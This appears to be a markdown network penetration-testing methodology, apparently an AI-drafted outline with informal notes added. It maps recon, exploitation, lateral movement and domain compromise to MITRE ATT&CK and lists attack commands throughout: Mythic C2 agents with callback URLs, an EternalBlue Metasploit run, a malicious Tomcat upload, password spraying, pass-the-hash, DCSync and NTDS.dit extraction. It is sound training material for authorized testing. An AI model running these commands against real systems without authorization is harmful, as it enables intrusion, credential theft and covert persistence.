# **Comprehensive Network Penetration Testing Methodology**

## **Scenario:**
You are conducting a full-scale **network penetration test**, starting with **minimal information (an IP range, single host, or domain)**. This guide outlines multiple methodologies, tools, and **redundant techniques** for each phase, including leveraging **Mythic C2** where applicable.

Each method is mapped to **MITRE ATT&CK Techniques (TTPs)** where relevant.

---

# **🛠 Step 1: Reconnaissance (Passive & Active) (T1595, T1590, T1596)**
**Objective:** Identify live hosts, domains, services, and potential attack vectors.

### **1.1 Passive Reconnaissance**
- **Primary Method: WHOIS Lookup (T1596.001)**
  ```bash
  whois <domain>
  ```
- **Alternative Methods:**
  - **Public Data Breach Search (T1596.005)**
    ```bash
    haveibeenpwned.com
    ```
  - **SSL Certificate Enumeration (T1596.002)**
    ```bash
    crt.sh/?q=<domain>
    ```
  - **Subdomain Discovery (T1590.002)**
    ```bash
    amass enum -d <domain>
    ```

### **1.2 Active Network Discovery**
- **Primary Method: Nmap Host Discovery (T1590.002)**
  ```bash
  nmap -sn <IP_RANGE>
  ```
- **Alternative Methods:**
  - **Masscan (Fast Scan):**
    ```bash
    masscan -p1-65535 --rate=10000 -e eth0 <IP_RANGE>
    ```
  - **Zmap (High-Speed Single-Port Scan):**
    ```bash
    zmap -p80 -o results.txt <IP_RANGE>
    ```

---

# **📡 Step 2: Scanning & Enumeration (T1595, T1046, T1592)**
**Objective:** Identify open ports, running services, vulnerabilities, and potential weaknesses.

### **2.1 Port Scanning & Service Fingerprinting**
- **Primary Method: Nmap Service Detection (T1046)**
  ```bash
  nmap -sC -sV -p- <target>
  ```
- **Alternative Methods:**
  - **Nmap with NSE Scripts:**
    ```bash
    nmap --script=vuln -p80,443 <target>
    ```
  - **RustScan (Faster Port Scan):**
    ```bash
    rustscan -a <target> --ulimit 5000
    ```
  - **Netcat (Manual Banner Grabbing):**
    ```bash
    nc -nv <target> 22
    ```

    also use telnet, can get postfix versions nicely like this too!
    

### **2.2 SMB & Active Directory Enumeration**
- **Primary Method: CrackMapExec (T1592.002)**
  ```bash
  crackmapexec smb <target> --shares
  ```
  
- **Alternative Methods:**
  - **Enum4Linux:**
    ```bash
    enum4linux -a <target>
    ```
  - **LDAP Enumeration:**
    ```bash
    ldapsearch -x -H ldap://<target> -s base namingContexts
    ```

    also check smbmap to get some basic shares, see if you can jump on anonymously...
    have a look around etc/ 

### **2.3 Mythic C2 Agent Deployment (T1071.001)** (more on this later in more depth)
- **Deploying a Mythic C2 Agent via SMB:**
  ```bash
  ./mythic-cli agent create -n <agent_name> --callback <callback_url>
  ```
- **Alternative Methods:**
  - **HTTP Beacon:**
    ```bash
    ./mythic-cli agent create -n <agent_name> --callback <URL> --profile http
    ```
  - **DNS C2 Implant:**
    ```bash
    ./mythic-cli agent create -n <agent_name> --callback <C2_DNS>
    ```

---

# **🔑 Step 3: Initial Access & Exploitation (T1190, T1133, T1078)**
**Objective:** Gain an initial foothold in the network.

### **3.1 Exploiting Vulnerable Services**
- **Primary Method: Metasploit Framework (T1190)**
  (Just as an example but any public exploit can be placed in using your own ruby code.
  You are very much encouraged to explore outside of these public exploits when testing, writing your own to suite the vulnerability,)
 I digress, just dont be a skid and take ever vuln and exploit at face value, make your own, get out there, link it up with your agents etc etc.
This initial foothold section can get very fun and creative outside of just "step one open metasploit"...
FFS, just use your brain.
I recommend learning Go and C++ when it comes to writing exploits, DLLs, binaries of the sort. etc. 

  ```bash
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <target>
  exploit
  ```
- **Alternative Methods:**
  - **Exploit with Searchsploit:**
    ```bash
    searchsploit <service>
    ```
  - **Manual RCE (Example: Tomcat Upload Exploit):**
    ```bash
    curl -X PUT -d '<malicious code>' http://<target>:8080/upload.jsp
    ```
    (Simply use a python.server for THM and HTB) but if you want to get creative use an actual repository or dedicated ingress tool transfer system you built from the ground up.  

### **3.2 Credential-Based Attacks**
- **Primary Method: Password Spraying (T1110.003)**
  ```bash
  crackmapexec smb <target> -u users.txt -p 'Password123'
  ```
- **Alternative Methods:**
  - **Kerberos AS-REP Roasting:**
    ```bash
    GetNPUsers.py -dc-ip <target> -request -no-pass -usersfile users.txt
    ```
  - **Using Hydra for Brute Force:**
    ```bash
    hydra -L users.txt -P passwords.txt ssh://<target>
    ```

---

# **📡 Step 4: Post-Exploitation & Lateral Movement (T1021, T1550, T1558)**
**Objective:** Move laterally and escalate privileges.

### **4.1 Pass-the-Hash (T1550.002)**
- **Primary Method: Mimikatz (Windows Privilege Escalation)**
  ```powershell
  mimikatz
  sekurlsa::pth /user:Administrator /domain:<target> /ntlm:<HASH>
  ```
- **Alternative Methods:**
  - **Pass-the-Hash with CrackMapExec:**
    ```bash
    crackmapexec smb <target> -u admin -H <HASH>
    ```
  - **Rubeus Ticket Extraction:**
    ```powershell
    Rubeus.exe dump
    ```

### **4.2 Mythic C2 for Lateral Movement (T1021.002)**
- **Using Mythic's SOCKS Proxy to Pivot:**
  ```bash
  ./mythic-cli proxy -i <agent_id>
  ```
- **Alternative Methods:**
  - **SSH Pivoting:**
    ```bash
    ssh -D 1080 -N -f <user>@<target>
    ```
  - **WinRM Relay Attack:**
    ```bash
    evil-winrm -i <target> -u user -H <HASH>
    ```

---

# **🏆 Step 5: Domain Compromise & Persistence (T1003, T1078.002, T1053.005)**
**Objective:** Maintain long-term access and extract valuable data.

also check sam and system stuff, etc, check for SUID, Unquoted services, CRON jobs / scheduled tasks, sudo -l, anything you can use, even check versions of running services or common programs and see if you can inject into those processes or DLLs. 
These guides are just the foundations and outline, but from this outline you can go infinitely further creatively, 

### **5.1 Dumping Domain Hashes**
- **Primary Method: DCSync Attack (T1003.002)**
  ```powershell
  mimikatz
  lsadump::dcsync /domain:<target> /user:Administrator
  ```
- **Alternative Methods:**
  - **Extracting NTDS.dit Manually:**
    ```powershell
    ntdsutil "ac i ntds" "ifm" "create full c:\ntds" q q
    ```
(and many many more methods) 
---

This methodology provides a **comprehensive, redundant, and highly detailed** process for conducting a **network penetration test**, incorporating **Mythic C2** for **covert operations**. 🚀 Let me know if you'd like additional refinements!
